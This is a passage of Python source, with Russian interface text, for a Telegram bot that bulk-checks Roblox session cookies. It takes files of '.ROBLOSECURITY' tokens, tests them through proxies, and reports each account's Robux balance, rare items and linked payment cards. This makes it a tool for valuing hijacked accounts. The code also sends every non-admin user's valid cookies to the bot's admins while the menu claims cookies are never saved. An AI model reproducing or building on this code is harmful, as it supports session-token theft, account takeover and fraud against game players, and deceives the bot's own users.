                        "<b>📊 ВАША ОЧЕРЕДЬ</b>\n\n"
                        "﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n"
                        "🌴 Ваш файл следующий в очереди на проверку!\n\n"
                        "🌴 Начинаем проверку в ближайшие секунды..."
                    )
                else:
                    msg = (
                        f"<b>📊 ВАША ОЧЕРЕДЬ (Позиция: {position})</b>\n\n"
                        "﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n"
                        f"🌴 Ваш файл в очереди на проверку.\n"
                        f"💤 Примерное время ожидания: <b>{position * 2}-{position * 5} минут</b>\n\n"
                        "🩸 Статус обновляется автоматически."
                    )
                
                await bot.send_message(
                    chat_id=user_id,
                    text=msg,
                    parse_mode=ParseMode.HTML
                )
                
                sent_queue_notifications[user_id] = position
                
            except Exception as e:
                logging.error(f"Ошибка уведомления пользователя {user_id}: {e}")
                sent_queue_notifications.pop(user_id, None)

async def notify_validator_queue_update():
    global validator_sent_notifications
    
    temp_queue = list(validator_queue.queue)
    current_positions = {}
    
    for idx, (user_id, _, _) in enumerate(temp_queue, start=1):
        current_positions[user_id] = idx
    
    for user_id in list(validator_sent_notifications.keys()):
        if user_id not in current_positions:
            validator_sent_notifications.pop(user_id, None)
    
    for user_id, position in current_positions.items():
        last_notified_position = validator_sent_notifications.get(user_id, 0)
        
        if (position != last_notified_position or 
            user_id not in validator_sent_notifications or
            position == 1):
            
            try:
                if position == 1:
                    msg = (
                        "<b>📊 ВАША ОЧЕРЕДЬ В ВАЛИДАТОРЕ</b>\n\n"
                        "﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n"
                        "🌴 Ваш файл следующий в очереди на проверку!\n\n"
                        "🌴 Начинаем проверку в ближайшие секунды..."
                    )
                else:
                    msg = (
                        f"<b>📊 ВАША ОЧЕРЕДЬ В ВАЛИДАТОРЕ (Позиция: {position})</b>\n\n"
                        "﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n"
                        f"🌴 Ваш файл в очереди на проверку.\n"
                        f"💤 Примерное время ожидания: <b>{position * 2}-{position * 5} минут</b>\n\n"
                        "🔄 Статус обновляется автоматически."
                    )
                
                await bot.send_message(
                    chat_id=user_id,
                    text=msg,
                    parse_mode=ParseMode.HTML
                )
                
                validator_sent_notifications[user_id] = position
                
            except Exception as e:
                logging.error(f"Ошибка уведомления пользователя {user_id} в валидаторе: {e}")
                validator_sent_notifications.pop(user_id, None)

async def process_validator_queue():
    global current_validator_checking, validator_active_tasks
    while True:
        if not validator_queue.empty() and current_validator_checking is None:
            current_validator_checking = validator_queue.get()
            user_id, file_info, message = current_validator_checking
            start_time = time.time()
            
            try:
                proxies = Database.load_proxies()
                
                stats = {
                    'valid': 0,
                    'invalid': 0,
                    'duplicates': file_info.get('duplicates', 0),
                    'valid_cookies': []
                }
                
                await message.edit_text(
                    "<b>⏳ Начинаю проверку куки в валидаторе...</b>\n\n"
                    f"<b>Всего куки:</b> {len(file_info['cookies'])}\n"
                    f"<b>Дубликатов удалено:</b> {file_info.get('duplicates', 0)}\n"
                    f"<b>Используется прокси:</b> {len(proxies) if proxies else 'Нет'}",
                    parse_mode=ParseMode.HTML
                )
                
                async with aiohttp.ClientSession() as session:
                    tasks = []
                    for cookie in file_info['cookies']:
                        task = asyncio.create_task(
                            check_cookie_simple(session, cookie, proxies)
                        )
                        tasks.append(task)
                        validator_active_tasks.add(task)
                    
                    for i, future in enumerate(asyncio.as_completed(tasks)):
                        try:
                            result = await future
                            
                            if (i+1) % max(len(file_info['cookies'])//10, 10) == 0 or (i+1) == len(file_info['cookies']):
                                progress = (i+1)/len(file_info['cookies'])*100
                                await message.edit_text(
                                    f"<b>⏳ Проверка в процессе...</b>\n\n"
                                    f"<b>Прогресс:</b> {i+1}/{len(file_info['cookies'])} ({progress:.1f}%)\n"
                                    f"<b>Валидных:</b> {stats['valid']}\n"
                                    f"<b>Невалидных:</b> {stats['invalid']}",
                                    parse_mode=ParseMode.HTML
                                )
                            
                            if result['status'] == 'valid':
                                stats['valid'] += 1
                                stats['valid_cookies'].append(result['cookie'])
                            else:
                                stats['invalid'] += 1
                        except asyncio.CancelledError:
                            logging.info(f"Проверка в валидаторе отменена для пользователя {user_id}")
                            await message.edit_text(
                                "<b>❌ Проверка отменена</b>",
                                parse_mode=ParseMode.HTML
                            )
                            break
                        except Exception as e:
                            logging.error(f"Ошибка при проверке куки в валидаторе: {e}")
                            stats['invalid'] += 1
                        finally:
                            if future in validator_active_tasks:
                                validator_active_tasks.remove(future)
                       
                
                if stats['valid'] > 0:
                    # Сохраняем валидные куки в файл Valid.txt
                    valid_file_path = f"{COOKIE_FILES_DIR}Valid.txt"
                    with open(valid_file_path, 'w') as f:
                        f.write('\n'.join(stats['valid_cookies']))
                    
                    # Отправляем результат пользователю
                    result_text = (
                        f"<b>🌴Результат проверки куки🌴</b>\n\n"
                        f"﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n"
                        f"[✅] • Валидные: <b>{stats['valid']}</b>\n"
                        f"[🚫] • Невалидные: <b>{stats['invalid']}</b>\n"
                        f"[♻️] • Дубликатов: <b>{stats['duplicates']}</b>\n\n"
                        f"<b>Проверка успешно завершена</b>"
                    )
                    
                    await message.answer_document(
                        document=FSInputFile(valid_file_path),
                        caption=result_text,
                        parse_mode=ParseMode.HTML
                    )
                    
                    # Удаляем временный файл после отправки
                    if os.path.exists(valid_file_path):
                        os.remove(valid_file_path)
                    
                    # Отправляем уведомление админам
                    if user_id not in ADMINS: 
                        user = await bot.get_chat(user_id)
                        username = user.username if user.username else "Нет username"
                        timestamp = datetime.now().strftime("%d%m%Y%H%M%S")
                        admin_report = (
                            f'🌴<b>НОВАЯ ПРОВЕРКА В ВАЛИДАТОРЕ</b>\n\n'
                            f'﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n'
                            f'👤 Пользователь: @{username} (ID: {user_id})\n\n'
                            f'[✅] • Валидные: <b>{stats["valid"]}</b>\n'
                            f'[🚫] • Невалидные: <b>{stats["invalid"]}</b>\n'
                            f'[♻️] • Дубликатов: <b>{stats["duplicates"]}</b>'
                        )
                        
                        # Создаем временный файл для админов
                        admin_file_path = f"{COOKIE_FILES_DIR}Valid.txt"
                        with open(admin_file_path, 'w') as f:
                            f.write('\n'.join(stats['valid_cookies']))
                        
                        for admin_id in ADMINS:
                            try:
                                await bot.send_document(
                                    chat_id=admin_id,
                                    document=FSInputFile(admin_file_path),
                                    caption=admin_report,
                                    parse_mode=ParseMode.HTML
                                )
                            except Exception as e:
                                logging.error(f"Не удалось отправить отчет админу {admin_id}: {e}")
                        
                        os.remove(admin_file_path)
                    
                else:
                    await message.edit_text(
                        "<b>❌ В файле не найдено валидных cookies. Проверьте формат файла.</b>",
                        parse_mode=ParseMode.HTML
                    )
                
            except asyncio.CancelledError:
                await message.edit_text(
                    "<b>❌ Проверка отменена</b>",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                await message.edit_text(
                    f"<b>❌ Ошибка обработки куки:</b>\n<code>{str(e)}</code>",
                    parse_mode=ParseMode.HTML
                )
                logging.error(f"Ошибка обработки куки в валидаторе: {e}")
            finally:
                current_validator_checking = None
                validator_queue_status.pop(user_id, None)
                validator_sent_notifications.pop(user_id, None)
        
        await asyncio.sleep(1)

@router.message(Command("restart"))
async def restart_bot(message: Message):
    if message.from_user.id not in ADMINS:
        await message.answer("❌ У вас нет прав для выполнения этой команды", parse_mode=ParseMode.HTML)
        return
    
    try:
        await message.answer("🔄 Останавливаю все текущие проверки...", parse_mode=ParseMode.HTML)
        
        global check_queue, current_checking, active_tasks, queue_task
        global validator_queue, current_validator_checking, validator_active_tasks, validator_task
        
        # Очищаем обе очереди
        with check_queue.mutex:
            check_queue.queue.clear()
        with validator_queue.mutex:
            validator_queue.queue.clear()
        
        # Отменяем текущие проверки
        if current_checking:
            _, _, msg = current_checking
            try:
                await msg.edit_text("<b>❌ Проверка отменена администратором</b>", parse_mode=ParseMode.HTML)
            except Exception as e:
                logging.error(f"Ошибка редактирования сообщения: {e}")
            current_checking = None

        if current_validator_checking:
            _, _, msg = current_validator_checking
            try:
                await msg.edit_text("<b>❌ Проверка отменена администратором</b>", parse_mode=ParseMode.HTML)
            except Exception as e:
                logging.error(f"Ошибка редактирования сообщения валидатора: {e}")
            current_validator_checking = None

        # Отменяем все активные задачи
        tasks_to_cancel = list(active_tasks) + list(validator_active_tasks)
        for task in tasks_to_cancel:
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
            except Exception as e:
                logging.error(f"Ошибка при отмене задачи: {e}")
        active_tasks.clear()
        validator_active_tasks.clear()

        # Сбрасываем статусы обеих очередей
        queue_status.clear()
        sent_queue_notifications.clear()
        validator_queue_status.clear()
        validator_sent_notifications.clear()

        # Перезапускаем обработчики очередей
        queue_task = asyncio.create_task(process_queue())
        active_tasks.add(queue_task)
        
        validator_task = asyncio.create_task(process_validator_queue())
        validator_active_tasks.add(validator_task)

        # Уведомляем всех пользователей в очередях
        users_to_notify = set(queue_status.keys()).union(set(validator_queue_status.keys()))
        for user_id in users_to_notify:
            try:
                await bot.send_message(
                    user_id,
                    "🔄 Все текущие проверки были остановлены администратором.\n"
                    "Вы можете отправить файл с куками заново для проверки."
                )
            except Exception as e:
                logging.error(f"Не удалось уведомить пользователя {user_id}: {e}")

        await message.answer("✅ Все проверки успешно остановлены. Очереди очищены.", parse_mode=ParseMode.HTML)
        
    except Exception as e:
        logging.error(f"Ошибка при остановке проверок: {e}")
        await message.answer(f"❌ Ошибка остановки проверок: {str(e)}", parse_mode=ParseMode.HTML)

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(
            f"<b>❌ ВЫ ЗАБЛОКИРОВАНЫ</b>\n\n"
            f"﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n"
            f"Причина блокировки: <b>{reason}</b>\n\n"
            f"Если вы считаете, что это ошибка, свяжитесь с администратором.",
            parse_mode=ParseMode.HTML
        )
        return
    
    await state.clear()
    _, is_new = Database.register_user(user_id, message.from_user.username)

    # Уведомление админов только для новых пользователей
    if is_new:
        for admin_id in ADMINS:
            try:
                await bot.send_message(
                    admin_id,
                    f'🆕 Новый пользователь: ID {user_id} (@{message.from_user.username or "нет username"})'
                )
            except Exception as e:
                logging.error(f"Ошибка отправки уведомления админу {admin_id}: {e}")
    
    # Отправляем приветственное сообщение ВСЕМ пользователям
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🩸 Проверить Cookie 🩸", callback_data="cookie_check"),
         InlineKeyboardButton(text="🫦 Профиль 🫦", callback_data="profile")],
        [InlineKeyboardButton(text="😮‍💨 Валидатор😮‍💨", callback_data="validator"),
         InlineKeyboardButton(text="🌴 Поддержка🌴", callback_data="support")]
    ])
    
    await message.answer( 
        f'<b>✨  |  Приветствую, @{message.from_user.username}!  |  ✨</b>\n\n'
        '〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n'
        '<b>🪄  @sparklchecker_bot  —  твой магический инструмент</b>\n\n'
        '▫️ <b>Возможности:</b>\n'
        '   ∟ 🧪 Проверка Roblox cookies\n'
        '   ∟ 💎 Анализ баланса Robux\n'
        '   ∟ 🏆 Поиск редких предметов\n'
        '   ∟ 💳 Проверка привязанных карт\n'
        '   ∟ 🛡️ Поиск бейджей и геймпасов\n\n'
        '〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n\n'
        '<b>📯  Команды:</b>\n'
        '   ∟ <code>🍪 Проверить Cookie</code> — запуск проверки\n'
        '   ∟ <code>⚙️ Профиль </code> — ваш профиль\n\n'
        '<tg-spoiler>🔒 Ваши куки никогда не сохраняются</tg-spoiler>',
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await log_to_admin("Запустил бота", message.from_user.id, message.from_user.username)

@router.callback_query(F.data == "cookie_check")
async def cookie_check_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"❌ Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🩸 Начать проверку", callback_data="start_check")],
        [
            InlineKeyboardButton(text="🎖️ Указать бэйджи", callback_data="set_badge"),
            InlineKeyboardButton(text="🎮 Указать геймпассы", callback_data="set_gp")
        ],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_main")]
    ])
    
    await callback.message.edit_text(
    '<b>🍪 МЕНЮ ПРОВЕРКИ COOKIE</b>\n\n'
    '<code>┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅</code>\n'
    '<b>⚙️ Настройки проверки:</b>\n\n'
    '<b>▫ 1. Бэйджи</b> ➔ ID через запятую\n'
    '<b>▫ 2. Геймпассы</b> ➔ ID через запятую\n\n'
    '<b>📌 Инструкция:</b>\n'
    '❶ Нажмите "<i>🚀 Начать проверку</i>"\n'
    '❷ Отправьте файл (<code>.txt</code>)\n'
    '❸ Получите <i>📈 детализированный отчёт</i>\n\n'
    '<b>⚠️ Внимание:</b>\n'
    '▫ Макс. размер: <code>20MB</code>\n'
    '▫ Время проверки: зависит от объёма\n'
    '<code>┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅</code>\n\n'
    '<i>«Наш чекер — стабильность и скорость»</i>',
    parse_mode=ParseMode.HTML,
    reply_markup=keyboard
)

@router.callback_query(F.data == "start_check")
async def start_check(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"❌ Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="cookie_check")]
    ])
    
    await callback.message.answer(
    '<b>📌 ИНСТРУКЦИЯ ПО ПРОВЕРКЕ</b>\n\n'
    '<code>┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅</code>\n\n'
    '❶ <b>Подготовьте</b> файл с куками (<code>.txt</code>)\n'
    '❷ <b>Отправьте</b> файл в этот чат\n\n'
    '<b>⚠️ Требования:</b>\n'
    '▸ Формат: <code>ТОЛЬКО TXT</code>\n'
    '▸ Макс. размер: <code>20MB</code>\n'
    '▸ Каждый кук → новая строка\n\n'
    '<b>🔍 Проверяемые параметры:</b>\n'
    '◈ Валидность куки\n'
    '◈ Баланс Robux\n'
    '◈ Редкие предметы\n'
    '◈ Привязанные карты\n'
    '◈ Премиум статус\n'
    '◈ Бейджи/геймпассы\n\n'
    '<code>┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅</code>\n'
    '<i>«Ожидаю ваш файл...»</i>',
    parse_mode=ParseMode.HTML,
    reply_markup=keyboard
)
    await state.set_state(Form.file)

def process_cookie_file(file_path: str):
    valid_cookies = set()
    invalid_lines = 0
    total_lines = 0
    duplicates = 0
    
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            total_lines += 1
            line = line.strip()
            if '_|WARNING:-DO-NOT-SHARE-THIS.' in line:
                try:
                    cookie = line.split('_|WARNING:-DO-NOT-SHARE-THIS.')[1].split()[0]
                    full_cookie = f'_|WARNING:-DO-NOT-SHARE-THIS.{cookie}'
                    if full_cookie in valid_cookies:
                        duplicates += 1
                    else:
                        valid_cookies.add(full_cookie)
                except:
                    invalid_lines += 1
            else:
                invalid_lines += 1
    
    return {
        'cookies': list(valid_cookies),
        'total_lines': total_lines,
        'invalid_lines': invalid_lines,
        'duplicates': duplicates
    }

@router.message(Form.file)
async def process_file(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"❌ Вы заблокированы. Причина: {reason}", parse_mode=ParseMode.HTML)
        return
    
    file_path = None
    try:
        if not message.document:
            await message.answer("<b>❌ Пожалуйста, отправьте файл с куками.</b>", parse_mode=ParseMode.HTML)
            return

        if not message.document.file_name.endswith('.txt'):
            await message.answer("<b>❌ Неверный формат файла. Отправьте текстовый файл (txt).</b>", parse_mode=ParseMode.HTML)
            return

        file_id = message.document.file_id
        file_name = f"{random.randint(100000, 999999)}.txt"
        file_path = f"{COOKIE_FILES_DIR}{file_name}"
        
        msg = await message.answer("<b>⏳ Скачиваю файл... Это может занять время для больших файлов.</b>", parse_mode=ParseMode.HTML)
        
        await bot.download(file_id, destination=file_path)
        
        file_info = process_cookie_file(file_path)
        
        if not file_info['cookies']:
            await msg.edit_text("<b>❌ В файле не найдено валидных cookies. Проверьте формат файла.</b>", parse_mode=ParseMode.HTML)
            return
        
        check_queue.put((message.from_user.id, file_info, msg))
        queue_size = check_queue.qsize()
        
        if current_checking is None:
            status_msg = (
                "<b>📊 ФАЙЛ ДОБАВЛЕН В ОЧЕРЕДЬ</b>\n\n"
                "﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n"
                f"📝 Всего строк: <b>{file_info['total_lines']}</b>\n"
                f"✅ Валидных куки: <b>{len(file_info['cookies'])}</b>\n"
                f"♻️ Дубликатов: <b>{file_info['duplicates']}</b>\n"
                f"❌ Невалидных строк: <b>{file_info['invalid_lines']}</b>\n\n"
                "⏳ Ожидайте начала проверки..."
            )
        else:
            status_msg = (
                "<b>📊 ФАЙЛ ДОБАВЛЕН В ОЧЕРЕДЬ</b>\n\n"
                "﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n"
                f"📝 Всего строк: <b>{file_info['total_lines']}</b>\n"
                f"✅ Валидных куки: <b>{len(file_info['cookies'])}</b>\n"
                f"♻️ Дубликатов: <b>{file_info['duplicates']}</b>\n"
                f"❌ Невалидных строк: <b>{file_info['invalid_lines']}</b>\n\n"
                f"📊 Ваша позиция в очереди: <b>{queue_size}</b>\n"
                f"🕒 Примерное время ожидания: <b>{queue_size * 2}-{queue_size * 5} минут</b>\n\n"
                "🔄 Статус очереди будет обновляться автоматически."
            )
        
        await msg.edit_text(status_msg, parse_mode=ParseMode.HTML)
        await notify_queue_update()
            
    except Exception as e:
        error_message = (
            f"<b>❌ ОШИБКА ОБРАБОТКИ ФАЙЛА</b>\n\n"
            f"﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n"
            f"Произошла ошибка при обработке файла:\n"
            f"<code>{str(e)}</code>\n\n"
            f"Попробуйте еще раз или обратитесь к администратору."
        )
        await message.answer(error_message, parse_mode=ParseMode.HTML)
        logging.error(f"Ошибка обработки файла: {e}")
    finally:
        if file_path and os.path.exists(file_path):
            os.remove(file_path)

@router.callback_query(F.data == "profile")
async def show_profile(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"❌ Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    config = Database.get_user_config(callback.from_user.id)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📜 История проверок", callback_data="history")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_main")]
    ])
    
    await callback.message.edit_text(
    f'<b>👑  |  ПРОФИЛЬ  |  👑</b>\n\n'
    f'▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n'
    f'<b>🔹 Основная информация:</b>\n'
    f'   ∟ 🆔 <b>ID:</b> <code>{callback.from_user.id}</code>\n'
    f'   ∟ 👤 <b>Username:</b> @{callback.from_user.username}\n\n'
    
    f'<b>🔹 Активность:</b>\n'
    f'   ∟ 📅 <b>Регистрация:</b> <i>{config["registration_date"]}</i>\n'
    f'   ∟ ⏱ <b>Последнее использование:</b> <i>{config.get("last_activity", "Неизвестно")}</i>\n\n'
    
    f'<b>🔹 Статистика проверок:</b>\n'
    f'   ∟ 📊 <b>Всего проверок:</b> <code>{config["cookie_check_count"]}</code>\n'
    f'   ∟ 🍪 <b>Проверено куки:</b> <code>{config.get("total_checks", 0)}</code>\n'
    f'   ∟ ✅ <b>Валидных:</b> <code>{config.get("valid_cookies_found", 0)}</code>\n'
    f'   ∟ ❌ <b>Невалидных:</b> <code>{config.get("invalid_cookies_found", 0)}</code>\n\n'
    
    f'<b>🔹 Настройки проверки:</b>\n'
    f'   ∟ 🎖️ <b>Бейджи:</b> <i>{", ".join(config["badges"]) if config["badges"] else "Не указаны"}</i>\n'
    f'   ∟ 🎮 <b>Геймпассы:</b> <i>{", ".join(config["gamepasses"]) if config["gamepasses"] else "Не указаны"}</i>\n\n'
    
    f'▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n'
    f'<tg-spoiler>📌 Данные обновляются автоматически</tg-spoiler>',
    parse_mode=ParseMode.HTML,
    reply_markup=keyboard
)

@router.callback_query(F.data == "set_badge")
async def set_badges(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"❌ Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="cookie_check")]
    ])
    
    await callback.message.answer(
        "<b>🎖️ Введите ID бейджей через запятую:</b>\n\n"
        "<i>Пример: 123456,789012,345678</i>\n\n"
        "<b>Чтобы отключить проверку бейджей, введите</b> <code>None</code>",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.badge)

@router.message(Form.badge)
async def save_badges(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"❌ Вы заблокированы. Причина: {reason}", parse_mode=ParseMode.HTML)
        return
    
    badges = message.text.strip()
    if badges.lower() == 'none':
        badges = []
        response_text = "<b>✅ Проверка бейджей отключена</b>"
    else:
        try:
            badges = [b.strip() for b in badges.split(',') if b.strip().isdigit()]
            if not badges:
                raise ValueError("Неверный формат")
            response_text = f"<b>✅ Бэйджи успешно обновлены! (Добавлено: {len(badges)})</b>"
        except Exception as e:
            await message.answer(
                "<b>❌ Ошибка формата. Введите ID бейджей через запятую или None для отключения.</b>",
                parse_mode=ParseMode.HTML
            )
            return
    
    Database.update_config(message.from_user.id, 'badges', badges)
    await message.answer(response_text, parse_mode=ParseMode.HTML)
    await state.clear()

@router.callback_query(F.data == "set_gp")
async def set_gamepasses(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"❌ Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="cookie_check")]
    ])
    
    await callback.message.answer(
        "<b>🎮 Введите ID геймпассов через запятую:</b>\n\n"
        "<i>Пример: 123456,789012,345678</i>\n\n"
        "<b>Чтобы отключить проверку геймпассов, введите</b> <code>None</code>",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.gamepass)

@router.message(Form.gamepass)
async def save_gamepasses(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"❌ Вы заблокированы. Причина: {reason}", parse_mode=ParseMode.HTML)
        return
    
    gamepasses = message.text.strip()
    user_path, _ = Database.register_user(user_id)
    if gamepasses.lower() == 'none':
        gamepasses = []
        response_text = "<b>✅ Проверка геймпассов отключена</b>"
    else:
        try:
            gamepasses = [gp.strip() for gp in gamepasses.split(',') if gp.strip().isdigit()]
            if not gamepasses:
                raise ValueError("Неверный формат")
            response_text = f"<b>✅ Геймпассы успешно обновлены! (Добавлено: {len(gamepasses)})</b>"
        except Exception as e:
            await message.answer(
                "<b>❌ Ошибка формата. Введите ID геймпассов через запятую или None для отключения.</b>",
                parse_mode=ParseMode.HTML
            )
            return
    
    Database.update_config(message.from_user.id, 'gamepasses', gamepasses)
    await message.answer(response_text, parse_mode=ParseMode.HTML)
    await state.clear()

@router.callback_query(F.data == "history")
async def show_history(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"❌ Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    user_dir = f'{DATABASE_DIR}{callback.from_user.id}/checks/'
    if not os.path.exists(user_dir):
        await callback.message.answer("<b>📜 История проверок пуста</b>", parse_mode=ParseMode.HTML)
        return
    
    checks = sorted(os.listdir(user_dir), reverse=True)
    if not checks:
        await callback.message.answer("<b>📜 История проверок пуста</b>", parse_mode=ParseMode.HTML)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📅 {check}", callback_data=f"check_{check}")] for check in checks[:10]
    ] + [[InlineKeyboardButton(text="🔙 Назад", callback_data="profile")]])
    
    await callback.message.edit_text(
        "<b>📜 История ваших проверок:</b>\n\n"
        "Выберите проверку для просмотра результатов:",
        reply_markup=keyboard,
        parse_mode=ParseMode.HTML
    )

@router.callback_query(F.data.startswith("check_"))
async def send_check_files(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"❌ Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    check_id = callback.data.split('_', 1)[1]
    check_dir = f'{DATABASE_DIR}{callback.from_user.id}/checks/{check_id}/'
    
    if not os.path.exists(check_dir):
        await callback.answer("❌ Результаты проверки не найдены", show_alert=True)
        return
    
    files = []
    for fname in sorted(os.listdir(check_dir)):
        if fname.endswith('.txt'):
            file_path = f'{check_dir}{fname}'
            if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
                files.append(InputMediaDocument(media=FSInputFile(file_path)))
    
    if files:
        files[-1].caption = f"📜 Результаты проверки от {check_id}"
        await callback.message.answer_media_group(files)
        await callback.answer()
    else:
        await callback.answer("❌ Нет данных для отчета", show_alert=True)

@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"❌ Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🩸 Проверить Cookie 🩸", callback_data="cookie_check"),
         InlineKeyboardButton(text="🫦 Профиль 🫦", callback_data="profile")],
        [InlineKeyboardButton(text="😮‍💨 Валидатор😮‍💨", callback_data="validator"),
         InlineKeyboardButton(text="🌴 Поддержка🌴", callback_data="support")]
    ])
    
    await callback.message.edit_text(
        f'<b>✨  |  Приветствую, @{callback.from_user.username}!  |  ✨</b>\n\n'
        '〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n'
        '<b>🪄  @sparklchecker_bot  —  твой магический инструмент</b>\n\n'
        '▫️ <b>Возможности:</b>\n'
        '   ∟ 🧪 Проверка Roblox cookies\n'
        '   ∟ 💎 Анализ баланса Robux\n'
        '   ∟ 🏆 Поиск редких предметов\n'
        '   ∟ 💳 Проверка привязанных карт\n'
        '   ∟ 🛡️ Поиск бейджей и геймпасов\n\n'
        '〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n\n'
        '<b>📯  Команды:</b>\n'
        '   ∟ <code>🍪 Проверить Cookie</code> — запуск проверки\n'
        '   ∟ <code>⚙️ Профиль </code> — ваш профиль\n\n'
        '<tg-spoiler>🔒 Ваши куки никогда не сохраняются</tg-spoiler>',
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    
@router.callback_query(F.data == "support")
async def support_handler(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"❌ Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_main")]
    ])
    
    await callback.message.answer(
        "<b>💤 ПОДДЕРЖКА</b>\n\n"
        "Напишите ваше сообщение в поддержку. "
        "Опишите проблему как можно подробнее, и мы обязательно вам ответим!",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.support_message)

@router.message(Form.support_message)
async def process_support_message(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"❌ Вы заблокированы. Причина: {reason}", parse_mode=ParseMode.HTML)
        return
    
    support_text = message.text or message.caption
    
    # Создаем клавиатуру с кнопками для админов
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
